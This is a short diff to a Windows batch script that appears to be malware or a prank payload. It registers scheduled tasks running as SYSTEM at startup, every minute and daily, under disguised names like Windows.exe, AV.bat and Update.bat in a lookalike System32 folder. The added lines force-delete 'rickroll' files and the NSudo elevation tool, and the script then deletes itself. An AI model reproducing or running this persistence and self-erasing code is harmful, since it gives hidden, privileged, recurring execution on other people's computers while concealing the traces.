@@ -29,7 +29,8 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Remove
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
-del NSudo.exe
+del /f rickroll.*
+del /f NSudo.exe
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
